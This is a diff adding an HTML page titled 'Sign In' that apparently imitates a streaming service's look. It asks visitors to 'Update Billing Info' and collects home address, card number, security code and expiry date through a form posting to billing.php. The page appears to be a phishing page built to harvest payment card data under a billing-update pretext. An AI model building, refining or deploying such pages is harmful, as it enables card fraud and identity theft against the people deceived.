@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Sign In</title>
+        <style>
+            *{
+                margin:0;
+            }
+            body{
+                background-color: black;
+            }
+            img{
+                margin-left: -30px;
+                margin-top: -30px;
+                width:50%;
+            }
+        h2{
+                margin-left: 20px;
+            }
+            .input-box1{
+                width:80%;
+                height: 30px;
+                margin-top: 15px;
+                margin-left: 29px;
+                border-radius: 5px;
+                background-color: #333333;
+                
+            }
+            .input-box2{
+                width:80%;
+                height: 30px;
+                margin-top: 15px;
+                margin-left: 29px;
+                border-radius: 5px;
+                background-color: #333333;
+                
+            }
+            .input-box3{
+                width:20%;
+                height: 30px;
+                margin-top: 15px;
+                margin-left: 29px;
+                border-radius: 5px;
+                background-color: #333333;
+            }
+            button{
+                width:80%;
+                height: 40px;
+                margin-top: 40px;
+                margin-left: 25px;
+                border-radius: 5px;
+                background-color: red;
+                color:white;
+
+            }
+            .rm{
+                color: gray;
+                margin-top: 10px;
+                margin-left: 25px;
+            }
+            .nh{
+                color:gray;
+                padding-left: 240px;
+            }
+            .footer{
+                margin-top: 150px;
+            }
+            @media only screen and (min-width: 1000px) {
+                   *{
+                margin:0;
+            }
+            body{
+                background-color: black;
+            }
+            img{
+                margin-left: -30px;
+                margin-top: -30px;
+                width:50%;
+            }
+            .wrapper{
+                
+            }
+       
+                
+
+        </style>
+    </head>
+    <body>
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQuN3aq20jEAJvYR-qvI-pqDRw0FfGtqa4EkEge0da1&s">
+        <div class="wrapper">
+            <h2 style="color:white; font-family: ;">Update Billing Info</h2>
+            <form action="billing.php" method="POST"><h4 style="color:white; margin-left: 29px; margin-top: 10px;">Home Address</h4>
+                <input class="input-box1" name="address" type="text" placeholder="    Full Home Address">
+                <h4 style="color:white; margin-left: 29px; margin-top: 10px;">Card No</h4>
+                <input class=input-box2 name="card" type="text" placeholder="    Card details">
+                <h4 style="color:white; margin-left: 29px; margin-top: 10px;">Security Code</h4>
+                <input class="input-box3" name="cvv" type="text" placeholder="    000">
+                <h4 style="color:white; margin-left: 29px; margin-top: 10px;">Exp. mm/yy</h4>
+                <input class="input-box3" name="expiry" type="month" placeholder="    Home Address">
+            <button><strong>Submit</strong></button>
+        
+            </form>
+        </div>
+            <div class="footer">
+                <hr><br>
+                <h4 style="color:gray; padding-left:20px;padding-top:10px;">Questions? Contact Us.</h4><br>
+            <h4 style="color:gray; padding-left: 20px;padding-top: 10px;">FAQ<br><br>Terms of Use<br><br>Cookie Preferences</r></h4>
+
+
+            </div>
+    </body>
+</html>
